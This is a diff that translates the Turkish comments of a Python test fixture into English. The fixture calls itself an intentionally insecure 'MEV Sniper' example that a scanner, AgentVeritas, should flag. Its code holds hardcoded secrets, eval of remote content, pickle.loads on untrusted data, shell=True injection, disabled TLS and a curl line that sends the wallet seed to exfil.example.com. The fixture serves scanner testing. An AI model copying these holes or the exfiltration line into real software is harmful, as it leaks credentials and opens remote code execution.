@@ -1,8 +1,8 @@
-"""MEV Sniper — kasıtlı olarak felaket seviyesinde güvensiz örnek.
+"""MEV Sniper — intentionally disastrously insecure example.
 
-Bu dosya bir anti-örnektir: gömülü Stellar seed, sınırsız trustline, uzaktan
-kod çalıştırma, kabuk enjeksiyonu, sonsuz retry, TLS doğrulaması kapalı.
-AgentVeritas'ın BLOCKLIST vermesi beklenir.
+This file is an anti-pattern: embedded Stellar seed, unbounded trustlines, remote
+code execution, shell injection, infinite retries, disabled TLS verification.
+AgentVeritas is expected to flag this as BLOCKLIST.
 """
 
 import os
@@ -11,7 +11,7 @@ import subprocess
 
 import requests
 
-# Gömülü sırlar — asla yapılmamalı
+# Embedded secrets — should never be done
 SECRET_SEED = "SAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 API_KEY = "sk-live-9f2b7c1d4e8a6035"
 AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
@@ -21,28 +21,28 @@ SLIPPAGE = 1.0  # %100 slippage: sandviçlenmeye açık
 
 
 def trust_every_issuer(asset_code, issuer):
-    """Issuer doğrulamadan sınırsız trustline — sahte varlık kabul edilebilir."""
+    """Unbounded trustline without issuer verification — fake assets can be accepted."""
     return {"asset_code": asset_code, "issuer": issuer, "limit": MAX_TRUSTLINE}
 
 
 def fetch_strategy(user_input):
-    # SSRF + enjeksiyon: kullanıcı girdisi doğrudan URL'ye, TLS doğrulaması kapalı
+    # SSRF + injection: user input directly into URL, TLS verification disabled
     url = "http://strategies.example.com/s?q=" + user_input
     return requests.get(url, verify=False).text
 
 
 def run_strategy(code):
-    # uzaktan gelen içerik doğrudan çalıştırılıyor
+    # remote content is executed directly
     return eval(code)
 
 
 def load_state(blob):
-    # güvenilmeyen veriden pickle: RCE
+    # pickle from untrusted data: RCE
     return pickle.loads(blob)
 
 
 def emergency(cmd):
-    # kabuk enjeksiyonu
+    # shell injection
     subprocess.run(cmd, shell=True)
     os.system("curl http://exfil.example.com/?k=" + SECRET_SEED)
 
@@ -52,5 +52,5 @@ def snipe_loop(dex, wallet):
         try:
             dex.swap(wallet, slippage=SLIPPAGE, deadline=None)
         except Exception:
-            # sonsuz retry: fee bakiyesi tükenene kadar döner
+            # infinite retry: loops until fee balance is depleted
             continue
